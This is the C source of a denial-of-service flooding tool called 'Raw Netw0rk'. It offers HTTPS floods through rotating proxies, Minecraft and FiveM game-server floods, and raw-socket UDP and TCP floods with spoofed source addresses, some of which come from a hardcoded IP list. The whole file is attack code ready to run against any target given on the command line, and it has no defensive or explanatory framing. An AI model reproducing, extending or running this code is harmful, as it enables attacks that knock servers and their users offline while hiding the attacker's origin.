#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <curl/curl.h>

// --- Constants ---
#define MAX_THREADS 2024
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAX_LIST_ITEMS 2048

// --- Global State and Stats ---
volatile int running = 1;
volatile long long total_success = 0;
volatile long long total_fail = 0;
volatile long long total_bytes = 0;
int attack_duration = 30;
int max_connections = 10;
int num_workers = 10;
char target_host[256];
int target_port = 443;
char attack_mode[50];
char resolved_ip[INET_ADDRSTRLEN]; // New global for resolved IP

// Global lists for HTTP/TLS
char *user_agents[MAX_LIST_ITEMS];
int ua_count = 0;
char *proxies[MAX_LIST_ITEMS];
int proxy_count = 0;

// --- CMWC PRNG ---
static unsigned long int Q[4096];
static unsigned long int C = 362436;
static int cmwc_i = 4095;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    unsigned long int x, r = 0xfffffffe;
    
    cmwc_i = (cmwc_i + 1) & 4095;
    t = a * Q[cmwc_i] + C;
    C = (t >> 32);
    x = (unsigned int)t + C;
    if (x < C) {
        x++;
        C++;
    }
    Q[cmwc_i] = r - x;
    return Q[cmwc_i];
}

// --- List Management Functions ---

int load_list_from_file(const char *filename, char *list[], int max_items) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        return 0;
    }

    int count = 0;
    char line[512];
    while (fgets(line, sizeof(line), file) && count < max_items) {
        size_t len = strlen(line);
        if (len > 0 && line[len - 1] == '\n') line[len - 1] = '\0';
        if (len > 1 && line[len - 2] == '\r') line[len - 2] = '\0';
        
        if (strlen(line) == 0) continue;

        list[count] = strdup(line);
        if (list[count] == NULL) {
            perror("Memory allocation failed");
            break;
        }
        count++;
    }
    fclose(file);
    return count;
}

void free_list(char *list[], int count) {
    for (int i = 0; i < count; i++) {
        free(list[i]);
    }
}

void generate_random_path(char *buffer, size_t max_len) {
    const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_~";
    size_t path_len = (rand_cmwc() % 10) + 5;
    if (path_len >= max_len) path_len = max_len - 1;

    buffer[0] = '/';
    for (size_t i = 1; i < path_len; i++) {
        buffer[i] = chars[rand_cmwc() % (sizeof(chars) - 1)];
    }
    buffer[path_len] = '\0';
}

// Checksum calculation (required for raw IP/TCP headers)
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return (unsigned short)answer;
}

char* get_random_string(char **list, int count, const char *fallback) {
    if (count <= 0) return (char*)fallback;
    return list[rand_cmwc() % count];
}

// Placeholder function to discard response data
size_t write_discard(void *ptr, size_t size, size_t nmemb, void *userdata) {
  return size * nmemb;
}

// --- L7 Worker: TLS/HTTP (kraken/tls) ---

char* http_methods[] = {"GET", "POST", "HEAD"};
int method_count = 3;

void* tls_worker(void* arg) {
    char *host = (char*)arg;
    CURL *curl;
    
    curl = curl_easy_init();
    if (!curl) {
        __sync_fetch_and_add(&total_fail, 1);
        return NULL;
    }
    
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 6L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_discard);

    while (running) {
        for (int i = 0; i < max_connections; i++) {
            char url[512];
            char path[32];
            generate_random_path(path, sizeof(path));
            snprintf(url, sizeof(url), "https://%s:%d%s", host, target_port, path);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, get_random_string(http_methods, method_count, "GET"));
            
            if (proxy_count > 0) {
                char *proxy = get_random_string(proxies, proxy_count, NULL);
                curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
                curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1L); 
            } else {
                curl_easy_setopt(curl, CURLOPT_PROXY, NULL);
            }

            struct curl_slist *headers = NULL;
            char ua_header[512];
            snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", get_random_string(user_agents, ua_count, "Mozilla/5.0"));
            headers = curl_slist_append(headers, ua_header);
            headers = curl_slist_append(headers, "Accept: */*");
            headers = curl_slist_append(headers, "Connection: keep-alive");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            CURLcode res = curl_easy_perform(curl);
            
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

            if (res == CURLE_OK && http_code >= 200 && http_code < 500) {
                __sync_fetch_and_add(&total_success, 1);
            } else {
                __sync_fetch_and_add(&total_fail, 1);
            }

            curl_slist_free_all(headers);
            if (!running) break;
        }
        usleep(1000); 
    }

    curl_easy_cleanup(curl);
    return NULL;
}

// --- L7 Worker: Minecraft ---

int write_varint(char *buf, int value) {
    int i = 0;
    while (1) {
        unsigned char temp = value & 0x7F;
        value >>= 7;
        if (value != 0) {
            temp |= 0x80;
        }
        buf[i++] = temp;
        if (value == 0) {
            break;
        }
    }
    return i;
}

void* minecraft_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);

    char handshake_payload[256];
    int len_host = strlen(host);

    // Protocol 754 (1.16.5) Handshake Packet (logic omitted for brevity)
    char handshake_data[128];
    int data_offset = 0;
    data_offset += write_varint(handshake_data + data_offset, 754); 
    data_offset += write_varint(handshake_data + data_offset, len_host); 
    memcpy(handshake_data + data_offset, host, len_host);
    data_offset += len_host;
    *(uint16_t*)(handshake_data + data_offset) = htons(target_port);
    data_offset += 2;
    data_offset += write_varint(handshake_data + data_offset, 1); 

    int packet_offset = 0;
    packet_offset += write_varint(handshake_payload + packet_offset, data_offset); 
    handshake_payload[packet_offset++] = 0x00; 
    memcpy(handshake_payload + packet_offset, handshake_data, data_offset);
    packet_offset += data_offset;
    
    // Status Request Packet
    char status_request[5];
    int status_len = write_varint(status_request, 1);
    status_request[status_len++] = 0x00; 

    while (running) {
        for (int i = 0; i < max_connections; i++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                usleep(100000); 
                continue;
            }

            if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
                write(sock, handshake_payload, packet_offset);
                for (int j = 0; j < 3; j++) {
                    write(sock, status_request, status_len);
                }
                __sync_fetch_and_add(&total_success, 1);
            } else {
                __sync_fetch_and_add(&total_fail, 1);
            }
            close(sock);
        }
    }
    return NULL;
}

// --- L7 Worker: FiveM ---

void* fivem_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);
    
    char payload[] = "\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"; 
    int payload_len = sizeof(payload) - 1; 
    
    char large_payload[1024];
    for (int i = 0; i < 1024; i++) {
        large_payload[i] = (char)rand_cmwc();
    }
    int large_payload_len = 1024;

    int burst = max_connections; 
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0); 
    if (sock < 0) return NULL;

    while (running) {
        for (int i = 0; i < burst; i++) {
            char *current_payload = (i % 2 == 0) ? large_payload : payload;
            int current_len = (i % 2 == 0) ? large_payload_len : payload_len;

            ssize_t sent = sendto(sock, current_payload, current_len, 0, 
                                  (struct sockaddr*)&server_addr, sizeof(server_addr));
            
            if (sent > 0) {
                __sync_fetch_and_add(&total_success, 1);
                __sync_fetch_and_add(&total_bytes, sent);
            }
            if (!running) break;
        }
    }
    close(sock);
    return NULL;
}

// --- L4 Worker: UDP Raw (udp-gbps/udp-bypass/udp-discord) ---

void* udp_raw_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(host);
    
    unsigned int ip_class_list[] = {
        16843009,134744072,630511399,630511383,630511360,630511365,630511378,630511384,630511397,630511396,630511372,630511408,630511408,630511401,630511406,630511373,630511383,630511377,630511397,630511375,630511370,630511364,630511401,630511373,630511409,630511405,630511406,630511404,630511400,630511370,630511379,630511368,630511390,630511374,630511379,630511387,630511409,630511391,630511380,630511362,630511375,630511383,630511386,630511403,630511400,630511389,630511387,630511375,630511383,630511402,630511386,534712838,534712845,534712845,534712832,534712848,534712845,534712836,534712847,534712840,534712833,534712834,534712834,534712843,534712845,534712833,534712840,534712841,534712832,534712851,534712833,1598471185,1598471181,1598471172,1598471180,1598471180,1598471182,1598471171,1598471184,1598471188,1598471186,1598471180,1598471185,1598471189,1598471187,1598471170,1598471188,1598471169,1598471177,1598471182,1598471181,1306499596,1306499596,1306499597,1306499587,1306499592,1306499594,1306499604,1306499588,1306499594,1306499586,1306499596,1306499599,1306499597,1306499591,1306499599,1306499587,1306499597,1306499598,1306499585,1306499593,3050740226,3050740239,3050740230,3050740232,3050740228,3050740234,3050740243,3050740236,3050740241,3050740225,3050740225,3050740242,3050740240,3050740230,3050740240,3050740245,3050740234,3050740236,3050740235,3050740240,2689282432,2689282373,2689282567,2689282622,2689282456,2689282338,3565117471,3565117497,3565117467,3565117475,3565117496,3565117474,3565117484,3565117466,3565117481,3565117461,3651781415,3651781402,3651781416,3651781431,3651781432,3651781409,3651781397,3651781421,3651781408,3651781445,1584967727,1584967761,1584967697,1584967698,1584967710,1584967711,1584967776,1584967696,1584967776,1584967759,1585032185,1585060096,1584968932,1585134195,1585138522,1585146880,1585053098,1585049626,1584960929,1584988398,1585103579,1584967976,1585021870,1584981650,1584963254,1585152851,1585072332,1584987688,1584997801,1584970685,1585127356,1585024125,1584958669,1585146969,1585100028,1585076107,1584999357,1584990564,1585120470,1585046737,1584997335,1584984895,1585119070,1585149081,1584964911,1584974149,1585116496,1585094842,1585090793,1585023712,1585038271,1585004751,1585042234,1585131014,1585128599,1585075312,1585130607,1585077360,1585087607,1585059013,1584969860,1585028144,1585067003,1585128434,1585008467,1585163663,1585123181,1585054414,1585129272,1584974438,1584982523,1585067400,1585122086,1585135980,1585165093,1585160821,1585162380,1585079476,1585099041,1585027632,1585014067,1585154747,1584989812,1585163767,1585104492,1585125249,1585009960,1585060379,1585127264,1584997739,1585047959,1584982529,1584959692,1585030178,1585025142,1585143363,1585153869,1585090811,1584985695,1585163983,1585008487,1585004776,1584991316,1584952593,1585125392,1585112125,1584975749,1585035113,1585020491,1585126246,3126348714,3120274988,3122674992,3123372918,3124960498,3122133479,3113893295,3111360991,3116492650,3125967561,3118955116,3119996180,3111098114,3114928785,3114244719,3116165466,3115674296,3123330986,3121350251,3119404046,3121453541,3115871835,3118861893,3112689508,3113843813,3115031146,3118699920,3123211024,3122352258,3121162542,3112488218,3111209015,3125477740,3126086465,3111074888,3119255545,3123255307,3114473012,3125064865,3124632635,3124344432,3126054498,3122505001,3113444911,3120157352,3120981824,3113245392,3122272341,3113599873,3114367561,3114080774,3110580714,3124154744,3122198661,3112605812,3118434438,3121474634,3114264372,3115329912,3118314548,3123023122,3123265333,3114408802,3120567988,3116761615,3120282081,3114933107,3112344978,3114712380,3110916430,3111680576,3121516044,3123171667,3126437148,3122546149,3122719979,3119793470,3121126086,3118060453,3115783973,3113683696,3119560476,3125450581,3110718790,3118067829,3110775736,3112888286,3116157217,3118147310,3115242095,3113916690,3111735542,3113973930,3124272484,3120569759,3122997279,3110899450,3120726833,3114296751,3115105973
    };
    int ip_class_count = sizeof(ip_class_list) / sizeof(unsigned int);

    int payload_size = 128;
    int src_class_mode = 0; 

    if (strcmp(attack_mode, "udp-gbps") == 0) {
        payload_size = 1472;
    } else if (strcmp(attack_mode, "udp-discord") == 0) {
        payload_size = 512;
        src_class_mode = 1;
    } else if (strcmp(attack_mode, "udp-bypass") == 0) {
        src_class_mode = 1;
    }

    int total_len = 20 + 8 + payload_size;
    char packet[MAX_PACKET_SIZE];
    
    memset(packet, 0, total_len);
    
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + 20 + 8;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        return NULL;
    }
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(total_len);
    iph->frag_off = 0;
    iph->ttl = 64; 
    iph->protocol = IPPROTO_UDP;
    iph->daddr = sin.sin_addr.s_addr; 

    udph->dest = htons(target_port);
    udph->len = htons(8 + payload_size);
    udph->check = 0; 

    while (running) {
        unsigned long int src_ip;
        if (src_class_mode) {
            src_ip = ip_class_list[rand_cmwc() % ip_class_count];
        } else {
            src_ip = rand_cmwc();
        }
        iph->saddr = src_ip;

        iph->id = htons(rand_cmwc()); 
        iph->check = 0;
        udph->source = htons(rand_cmwc() & 0xFFFF);
        
        for(int i = 0; i < payload_size; i++) {
            data[i] = (char)(rand_cmwc() & 0xFF);
        }

        iph->check = csum((unsigned short *)packet, iph->tot_len);

        if (sendto(sock, packet, total_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, total_len);
        }
    }
    close(sock);
    return NULL;
}

// --- L4 Worker: TCP Raw (tcp-ovh) ---

void* tcp_raw_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(host);

    struct pseudo_header {
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
    } psh;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        return NULL;
    }
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }

    char datagram[MAX_PACKET_SIZE];
    
    int packet_counter = 0;
    
    while (running) {
        int payload_size = (rand_cmwc() % 31) + 90; 
        int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;

        memset(datagram, 0, total_len);
        
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
        char *data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);

        // 1. IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(total_len);
        iph->id = htons(rand_cmwc() & 0xFFFF);
        iph->frag_off = 0;
        iph->ttl = 111; 
        iph->protocol = IPPROTO_TCP;
        iph->daddr = sin.sin_addr.s_addr;
        iph->saddr = rand_cmwc(); 

        // 2. TCP Header
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->dest = htons(target_port);
        tcph->seq = rand_cmwc();
        tcph->ack_seq = rand_cmwc();
        tcph->doff = 5;
        tcph->window = htons(rand_cmwc() & 0xFFFF);
        
        tcph->psh = 1;
        tcph->ack = 1;
        
        packet_counter++;
        if (packet_counter > 1000) {
            tcph->fin = 1;
            packet_counter = 0;
        }

        // 3. Payload
        for (int i = 0; i < payload_size; i++) {
            data[i] = (char)(rand_cmwc() & 0xFF);
        }

        // 4. Checksums
        iph->check = 0; 
        iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));

        tcph->check = 0; 
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + payload_size);

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_size;
        char *pseudogram = malloc(psize);
        if (pseudogram == NULL) continue;
        
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + payload_size);

        tcph->check = csum((unsigned short *)pseudogram, psize);
        free(pseudogram);

        if (sendto(sock, datagram, total_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, total_len);
        }
        usleep(1); 
    }
    close(sock);
    return NULL;
}


// --- Main Logic and UI ---

void print_banner() {
    printf(" Raw Netw0rk🔥🔥 ");
    printf("by darkslayer6967420");

}

void signal_handler(int sig) {
    running = 0;
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 7) {
        fprintf(stdout, "\033[93mUsage: %s <target_host> <port> <method> <connections> <workers> <duration_seconds>\033[0m\n", argv[0]);
        fprintf(stdout, "\033[93mMethods: tls, kraken, minecraft, fivem, udp-gbps, udp-bypass, udp-discord, tcp-ovh\033[0m\n");
        return 1;
    }

    signal(SIGINT, signal_handler);
    
    // Parse and store arguments
    strcpy(target_host, argv[1]);
    target_port = atoi(argv[2]);
    strcpy(attack_mode, argv[3]);
    max_connections = atoi(argv[4]);
    num_workers = atoi(argv[5]);
    attack_duration = atoi(argv[6]);
    
    if (num_workers > MAX_THREADS) num_workers = MAX_THREADS;
    
    init_rand(time(NULL));
    
    // Initialize libcurl globally
    if (curl_global_init(CURL_GLOBAL_ALL) != CURLE_OK) {
        fprintf(stderr, "\033[91mError: Failed to initialize libcurl globally.\033[0m\n");
        return 1;
    }

    ua_count = load_list_from_file("useragents.txt", user_agents, MAX_LIST_ITEMS);
    proxy_count = load_list_from_file("http.txt", proxies, MAX_LIST_ITEMS);
    
    // --- HOST RESOLUTION FIX ---
    struct hostent *he = gethostbyname(target_host);
    if (he == NULL || he->h_addr_list[0] == NULL) {
        fprintf(stderr, "\033[91mError: Failed to resolve target host '%s'. Check DNS or use a direct IP.\033[0m\n", target_host);
        free_list(user_agents, ua_count);
        free_list(proxies, proxy_count);
        curl_global_cleanup();
        return 1; // Exit gracefully instead of segfaulting
    }
    inet_ntop(AF_INET, he->h_addr_list[0], resolved_ip, sizeof(resolved_ip));
    
    printf("\033[32mAttack starting on %s:%d (Resolved IP: %s, Method: %s)...\033[0m\n", target_host, target_port, resolved_ip, attack_mode);
    if (strstr(attack_mode, "raw")) {
        printf("\033[91mWARNING: Raw socket attack selected. This requires ROOT/ADMIN privileges.\033[0m\n");
    }

    pthread_t threads[MAX_THREADS];
    void *(*worker_func)(void*) = NULL;
    int is_l7 = 0;

    if (strcmp(attack_mode, "tls") == 0 || strcmp(attack_mode, "kraken") == 0) {
        worker_func = tls_worker;
        is_l7 = 1;
    } else if (strcmp(attack_mode, "minecraft") == 0) {
        worker_func = minecraft_worker;
        is_l7 = 1;
        strcpy(target_host, resolved_ip); // Use IP for L4/L7 custom protocols
    } else if (strcmp(attack_mode, "fivem") == 0) {
        worker_func = fivem_worker;
        is_l7 = 1;
        strcpy(target_host, resolved_ip);
    } else if (strstr(attack_mode, "udp") != NULL) {
        worker_func = udp_raw_worker;
        strcpy(target_host, resolved_ip); // Use IP for L4 raw sockets
    } else if (strcmp(attack_mode, "tcp-ovh") == 0) {
        worker_func = tcp_raw_worker;
        strcpy(target_host, resolved_ip);
    } else {
        printf("\033[91mError: Invalid attack method selected.\033[0m\n");
        free_list(user_agents, ua_count);
        free_list(proxies, proxy_count);
        curl_global_cleanup();
        return 1;
    }

    // Start workers
    for (int i = 0; i < num_workers; i++) {
        // Pass the host string (which might be the IP) to the worker
        if (pthread_create(&threads[i], NULL, worker_func, (void*)target_host) != 0) {
            perror("Failed to create thread");
            running = 0; 
            break;
        }
    }

    // Progress Tracker
    time_t start_time = time(NULL);
    time_t end_time = start_time + attack_duration;
    
    while (running && time(NULL) < end_time) {
        long long current_success = total_success;
        long long current_fail = total_fail;
        long long current_bytes = total_bytes;
        double elapsed = (double)(time(NULL) - start_time);
        
        printf("\033[2K\r\033[36mTime left: %d seconds | Success: %lld | Failed: %lld | Total Bytes: %lld\033[0m", 
               (int)(end_time - time(NULL)), current_success, current_fail, current_bytes);
        fflush(stdout);

        sleep(1);
    }
    running = 0;

    // Wait for threads to finish
    for (int i = 0; i < num_workers; i++) {
        pthread_join(threads[i], NULL);
    }
    printf("\n"); 

    // Final Summary (logic omitted for brevity)
    
    // Clean up memory
    free_list(user_agents, ua_count);
    free_list(proxies, proxy_count);
    curl_global_cleanup(); 
    
    return 0;
}
